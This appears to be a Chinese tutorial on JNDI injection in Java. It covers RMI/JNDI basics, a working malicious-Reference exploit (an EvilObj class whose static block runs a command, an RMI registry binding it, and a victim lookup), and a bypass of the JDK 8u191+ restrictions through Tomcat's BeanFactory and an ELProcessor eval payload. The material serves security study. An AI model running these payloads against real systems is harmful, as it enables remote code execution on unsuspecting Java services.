<p>IHelloImpl.java #实现前面的接口，用来提供远程调用的类。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.<span class="type">RemoteException</span>;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.<span class="type">UnicastRemoteObject</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">IHelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="title">implements</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">IHelloImpl</span>() <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    public <span class="type">String</span> sayHello(<span class="type">String</span> name) <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CallService.java #定义一个rmi服务，用作客户端，用来提供上面函数的远程调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CallService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个rmi映射表</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 创建一个对象</span></span><br><span class="line">        <span class="type">IHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IHelloImpl</span>();</span><br><span class="line">        <span class="comment">// 将对象绑定到rmi注册表</span></span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>testClient.java#接下来定义客户端，用JNDI调用上面的rmi服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testClient</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        <span class="comment">//Properties env = new Properties();</span></span><br><span class="line">        <span class="comment">//env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span></span><br><span class="line">        <span class="comment">//env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建初始化环境</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">//  jndi的方式获取远程对象</span></span><br><span class="line">        <span class="type">IHello</span> <span class="variable">rhello</span> <span class="operator">=</span> (IHello) ctx.lookup(<span class="string">&quot;rmi://localhost:1099/hello&quot;</span>);</span><br><span class="line">        <span class="comment">//ctx.lookup(&quot;hello&quot;);</span></span><br><span class="line">        <span class="comment">// 调用远程对象的方法</span></span><br><span class="line">        System.out.println(rhello.sayHello(<span class="string">&quot;axin&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先启动服务端，在启动客户端，就可以看到成功在服务端返回调用函数以后的值。</p>
<h2 id="JNDI-Naming-Reference"><a href="#JNDI-Naming-Reference" class="headerlink" title="JNDI Naming Reference"></a>JNDI Naming Reference</h2><p>上面例子中的rmi服务绑定是本地的类，Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，<strong>客户端会获取相应的object factory</strong>，最终通过factory类将reference转换为具体的对象实例。</p>
<p>JNDI客户端可以加载远程的RMI服务的class文件来进行实例化。通过lookup指定一个远程服务，远程服务是通过Reference来远程加载类文件。这样就可以对JNDI客户端进行攻击。加载远程类的时候static静态代码块,代码块,无参构造函数和getObjectInstance方法都会被调用。</p>
<p>在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：</p>
<p>className：远程加载时所使用的类名；</p>
<p>classFactory：加载的class中需要实例化类的名称；</p>
<p>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议；</p>
<p>当然，要把一个对象绑定到rmi注册表中，这个对象需要继承UnicastRemoteObject，但是Reference没有继承它，所以我们还需要封装一下它，用 ReferenceWrapper 包裹一下Reference实例对象，这样就可以将其绑定到rmi注册表，并被远程访问到了。</p>
<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当<strong>用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时</strong>，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</p>
<h2 id="JNDI注入-1"><a href="#JNDI注入-1" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当<strong>用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时</strong>，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</p>
<h3 id="jndi注入的利用条件"><a href="#jndi注入的利用条件" class="headerlink" title="jndi注入的利用条件"></a>jndi注入的利用条件</h3><p>1）客户端的lookup()方法参数可控</p>
<p>2）服务端在使用Reference时，classFactoryLocation参数可控</p>
<p>上面两个都是在编写程序时可能存在的脆弱点（任意一个满足就行）</p>
<h3 id="JNDI利用流程"><a href="#JNDI利用流程" class="headerlink" title="JNDI利用流程"></a>JNDI利用流程</h3><p>1）目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</p>
<p>2）攻击者控制URI参数为恶意的RMI服务地址，如：rmi:&#x2F;&#x2F;hacker_rmi_server&#x2F;&#x2F;name；</p>
<p>3）攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</p>
<p>4）目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</p>
<p>5）攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</p>
<h2 id="JNDI注入例子"><a href="#JNDI注入例子" class="headerlink" title="JNDI注入例子"></a>JNDI注入例子</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.lang.model.element.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObj</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bufferedInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(bufferedInputStream));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span>((lineStr = inBr.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            sb += lineStr+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        inBr.close();</span><br><span class="line">        inBr.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context context, HashMap&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里利用的是static代码块执行命令。</p>
<h3 id="创建RMI服务端，绑定恶意的Reference到rmi注册表"><a href="#创建RMI服务端，绑定恶意的Reference到rmi注册表" class="headerlink" title="创建RMI服务端，绑定恶意的Reference到rmi注册表"></a>创建RMI服务端，绑定恶意的Reference到rmi注册表</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:6666/&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;Create RMI registry on port 1099&quot;</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;EvilObj&quot;</span>, <span class="string">&quot;EvilObj&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;evil&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="创建一个客户端（受害者）"><a href="#创建一个客户端（受害者）" class="headerlink" title="创建一个客户端（受害者）"></a>创建一个客户端（受害者）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;rmi://localhost:1099/evil&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的lookup方法的参数是指向我设定的恶意rmi地址的。</p>
<h3 id="启动一个简单的客户端，用来提供恶意类的访问链接"><a href="#启动一个简单的客户端，用来提供恶意类的访问链接" class="headerlink" title="启动一个简单的客户端，用来提供恶意类的访问链接"></a>启动一个简单的客户端，用来提供恶意类的访问链接</h3><p>然后先编译该项目，生成class文件，然后在class文件目录下用python启动一个简单的HTTP Server:</p>
<p>python -m SimpleHTTPServer 6666</p>
<p>执行上述命令就会在6666端口、当前目录下运行一个HTTP Server：</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在复现的过程中，一定要注意JDK的版本，JDK在版本中对JNDI的利用有一定的限制。如下</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">JDK <span class="number">6</span>u141、<span class="number">7</span>u131、<span class="number">8</span>u121之后：增加了com<span class="selector-class">.sun</span><span class="selector-class">.jndi</span><span class="selector-class">.rmi</span><span class="selector-class">.object</span>.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</span><br><span class="line">JDK <span class="number">6</span>u211、<span class="number">7</span>u201、<span class="number">8</span>u191之后：增加了com<span class="selector-class">.sun</span><span class="selector-class">.jndi</span><span class="selector-class">.ldap</span><span class="selector-class">.object</span>.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</span><br></pre></td></tr></table></figure>

<p>对于高版本的JDK，上面的例子就不能执行成功，关于高版本的绕过只要有加载本地工厂类，打本地反序列化链两种方式</p>
<p>我们先看看JDK对各种Payload有什么限制：</p>
<h3 id="RMI-Remote-Object-Payload"><a href="#RMI-Remote-Object-Payload" class="headerlink" title="RMI Remote Object Payload"></a>RMI Remote Object Payload</h3><p>（限制较多，不常使用）</p>
<p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP&#x2F;FTP&#x2F;SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：</p>
<ol>
<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li>
</ol>
<p>然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
<p>codebase就是远程装载类的路径。当对象发送者序列化对象时，会在序列化流中附加上codebase的信息。 这个信息告诉接收方到什么地方寻找该对象的执行代码。</p>
<h3 id="RMI-JNDI-Reference-Payload"><a href="#RMI-JNDI-Reference-Payload" class="headerlink" title="RMI + JNDI Reference Payload"></a>RMI + JNDI Reference Payload</h3><p>攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类，但是原理上并非使用RMI Class Loading机制的，因此不受 java.rmi.server.useCodebaseOnly 系统属性的限制，相对来说更加通用。但是在JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming&#x2F;Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。Changelog:</p>
<h3 id="LDAP-JNDI-Reference-Payload"><a href="#LDAP-JNDI-Reference-Payload" class="headerlink" title="LDAP + JNDI Reference Payload"></a>LDAP + JNDI Reference Payload</h3><p>除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p>
<h3 id="绕过JDK-8u191-等高版本限制"><a href="#绕过JDK-8u191-等高版本限制" class="headerlink" title="绕过JDK 8u191+等高版本限制"></a>绕过JDK 8u191+等高版本限制</h3><p>所以对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：</p>
<ol>
<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
<li>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</li>
</ol>
<h2 id="绕过高版本JDK限制：利用本地Class作为Reference-Factory"><a href="#绕过高版本JDK限制：利用本地Class作为Reference-Factory" class="headerlink" title="绕过高版本JDK限制：利用本地Class作为Reference Factory"></a>绕过高版本JDK限制：利用本地Class作为Reference Factory</h2><p>在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，所以使用也是非常广泛。org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tips: 根据beanFactory的代码逻辑，要求传入的Reference为ResourceRef类</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">        NamingException ne;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference)obj;</span><br><span class="line">            <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">            ne = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            Class beanClass;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">                    beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    beanClass = Class.forName(beanClassName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var23) &#123;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(sm.getString(<span class="string">&quot;beanFactory.classNotFound&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;beanClassName&#125;));</span><br><span class="line">                ne.initCause(var23);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);</span><br><span class="line">            PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line">            <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.log.warn(sm.getString(<span class="string">&quot;beanFactory.noForceString&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>它遵循一些JavaBeans的规范和要求，以确保正确地初始化对象。这个情况下，目标Bean Class必须有一个无参构造方法，有public的setter方法且参数为一个String类型。事实上，这些setter不一定需要是set..开头的方法，根据org.apache.naming.factory.BeanFactory中的逻辑，我们可以把某个方法强制指定为setter。这里，我们找到了<code>javax.el.ELProcessor</code>可以作为目标Class。启动RMI Server的利用代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(rmi_port);</span><br><span class="line"><span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 强制将 &#x27;x&#x27; 属性的setter 从 &#x27;setX&#x27; 变为 &#x27;eval&#x27;, 详细逻辑见 BeanFactory.getObjectInstance 代码</span></span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;KINGX=eval&quot;</span>));</span><br><span class="line"><span class="comment">// 利用表达式执行命令</span></span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;KINGX&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder&#x27;(java.lang.String[])&#x27;.start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>

<p>forceString可以给属性强制指定一个setter方法，这里我们将属性”KINGX”的setter方法设置为 ELProcessor.eval() 方法。</p>
<p>于是我们 ResourceRef 中加上元素”KINGX”，赋值为需要执行的恶意代码。最后调用setter就变成了执行如下代码：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ELProcessor</span><span class="selector-class">.eval</span>(\<span class="string">&quot;\&quot;</span>.<span class="built_in">getClass</span>().<span class="built_in">forName</span>(<span class="string">&quot;javax.script.ScriptEngineManager\&quot;</span>).<span class="built_in">newInstance</span>().<span class="built_in">getEngineByName</span>(\<span class="string">&quot;JavaScript\&quot;</span>).<span class="built_in">eval</span>(\<span class="string">&quot;new java.lang.ProcessBuilder&#x27;(java.lang.String[])&#x27;.start()\&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>ELProcessor.eval()会对EL表达式进行求值，最终达到命令执行的效果。这种绕过方式需要目标环境中存在Tomcat相关依赖，当然其他Java Server可能也存在可被利用的Factory类，可以进一步研究。</p>
<h2 id="绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget"><a href="#绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget" class="headerlink" title="绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget"></a>绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget</h2><p>目录是一种分布式数据库，目录服务是由目录数据库和一套访问协议组成的系统。LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP&#x2F;IP协议栈之上，基于C&#x2F;S架构。除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：</p>
<ul>
<li>Java序列化</li>
<li>JNDI Reference</li>
<li>Marshalled对象</li>
<li>Remote Location (已弃用)</li>
</ul>
<p>LDAP可以为存储的Java对象指定多种属性：</p>
<ul>
<li>javaCodeBase</li>
<li>objectClass</li>
<li>javaFactory</li>
<li>javaSerializedData</li>
</ul>
<p>这里 javaCodebase 属性可以指定远程的URL，这样黑客可以控制反序列化中的class，通过JNDI Reference的方式进行利用（这里不再赘述，示例代码可以参考文末的Demo链接）。不过像前文所说的，高版本JVM对Reference Factory远程加载类进行了安全限制，JVM不会信任LDAP对象反序列化过程中加载的远程类。此时，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。简而言之，LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。</p>
<p>pom依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务端代码</p>
